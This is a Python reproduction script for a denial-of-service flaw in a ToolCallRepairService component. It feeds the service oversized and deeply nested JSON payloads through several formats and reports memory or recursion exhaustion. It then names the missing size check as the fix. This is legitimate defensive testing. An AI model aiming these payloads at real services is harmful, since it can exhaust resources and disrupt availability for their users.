#!/usr/bin/env python3
"""
Reproduction script for DoS vulnerability in ToolCallRepairService.
"""

import json
import time
import sys
from pathlib import Path

# Add src directory to path
project_root = Path(__file__).parent.parent.parent
sys.path.insert(0, str(project_root))

from dev.artifacts.di_helper import get_tool_call_repair_service


def create_large_json_payload(multiplier=1):
    """Create a large JSON payload to trigger DoS."""
    print(f"Creating large JSON payload ({multiplier}x multiplier)...")

    large_array = []
    for i in range(200000 * multiplier):  # 200k elements * multiplier
        large_array.append(
            {
                "id": i,
                "data": "x" * 200,  # 200 chars per item
                "nested": {
                    "level1": {
                        "level2": {
                            "level3": {
                                "level4": {"level5": "very deep nesting test data"}
                            }
                        }
                    }
                },
            }
        )

    malicious_data = {
        "function_call": {
            "name": "test_tool",
            "arguments": {
                "large_array": large_array,
                "duplicate_array": large_array.copy(),  # Double the size
            },
        }
    }

    return json.dumps(malicious_data)


def test_dos_vulnerability():
    """Test DoS vulnerability in ToolCallRepairService."""
    print("=== ToolCallRepairService DoS Vulnerability Test ===")

    repair_service = get_tool_call_repair_service()

    # Test with progressively larger payloads
    multipliers = [1, 2, 5, 10]  # Different sizes

    for multiplier in multipliers:
        print(f"\n--- Testing with {multiplier}x multiplier ---")

        malicious_json = create_large_json_payload(multiplier)
        payload_size_mb = len(malicious_json.encode("utf-8")) / (1024 * 1024)
        print(f"Payload size: {payload_size_mb:.2f}MB")

        # Test multiple attack vectors
        attack_vectors = [
            ("Code block", f"```json\n{malicious_json}\n```"),
            ("Direct JSON", malicious_json),
            ("Tool format", f'{{"tool": {malicious_json}}}'),
            ("Function call format", f'{{"function_call": {malicious_json}}}'),
        ]

        for vector_name, content in attack_vectors:
            print(f"\nTesting {vector_name} attack vector...")

            start_time = time.time()

            try:
                result = repair_service.repair_tool_calls(content)

                end_time = time.time()
                duration = end_time - start_time

                print(f"  [OK] Completed in {duration:.2f} seconds")

                if duration > 3.0:
                    print(
                        f"  [!] VULNERABILITY CONFIRMED: {vector_name} took > 3 seconds!"
                    )
                    print(f"      Payload size: {payload_size_mb:.2f}MB")
                    print(f"      Processing time: {duration:.2f} seconds")
                    return True

            except MemoryError:
                end_time = time.time()
                duration = end_time - start_time
                print(f"  [ERROR] MemoryError after {duration:.2f} seconds")
                print("  [!] VULNERABILITY CONFIRMED: Memory exhaustion!")
                return True
            except RecursionError:
                end_time = time.time()
                duration = end_time - start_time
                print(f"  [ERROR] RecursionError after {duration:.2f} seconds")
                print("  [!] VULNERABILITY CONFIRMED: Stack overflow!")
                return True
            except Exception as e:
                end_time = time.time()
                duration = end_time - start_time
                print(
                    f"  [ERROR] Failed after {duration:.2f} seconds: {type(e).__name__}: {e}"
                )

                if "Memory" in str(e) or "too large" in str(e):
                    print("  [!] VULNERABILITY CONFIRMED: Resource exhaustion!")
                    return True

    # Test with extremely nested JSON
    print("\n--- Testing deeply nested JSON ---")
    try:

        def create_nested_dict(depth):
            if depth <= 0:
                return {"value": "deep_value", "data": "x" * 1000}
            return {"nested": create_nested_dict(depth - 1), "data": "x" * 100}

        nested_payload = {
            "function_call": {
                "name": "test_tool",
                "arguments": {"deeply_nested": create_nested_dict(2000)},
            }
        }

        nested_json = json.dumps(nested_payload)
        nested_size_mb = len(nested_json.encode("utf-8")) / (1024 * 1024)
        print(f"Deeply nested payload size: {nested_size_mb:.2f}MB")

        start_time = time.time()
        result = repair_service.repair_tool_calls(f"```json\n{nested_json}\n```")
        duration = time.time() - start_time

        print(f"[OK] Deep nesting completed in {duration:.2f} seconds")

        if duration > 2.0:
            print("[!] VULNERABILITY CONFIRMED: Deep nesting caused slowdown!")
            return True

    except RecursionError:
        print("[ERROR] RecursionError with deeply nested payload!")
        print("[!] VULNERABILITY CONFIRMED: Stack overflow from deep nesting!")
        return True
    except Exception as e:
        print(f"[ERROR] Deep nesting failed: {type(e).__name__}: {e}")

    print("\n=== Test Complete ===")
    print("DoS vulnerability exists if any of the following occurred:")
    print("1. Processing took > 3 seconds for any payload")
    print("2. MemoryError or RecursionError was thrown")
    print("3. Clear correlation between payload size and processing time")
    print("\nThe issue is in ToolCallRepairService._process_json_match()")
    print("which calls json.loads() without size validation.")

    return False


if __name__ == "__main__":
    vulnerability_confirmed = test_dos_vulnerability()

    if vulnerability_confirmed:
        print("\n[!] DOS VULNERABILITY CONFIRMED!")
        print("Fix needed: Add size validation to _process_json_match method")
        sys.exit(1)
    else:
        print(
            "\n[?] Inconclusive - may need larger payloads or different attack patterns"
        )
        print(
            "However, the lack of size validation in _process_json_match is still a risk"
        )
        sys.exit(0)
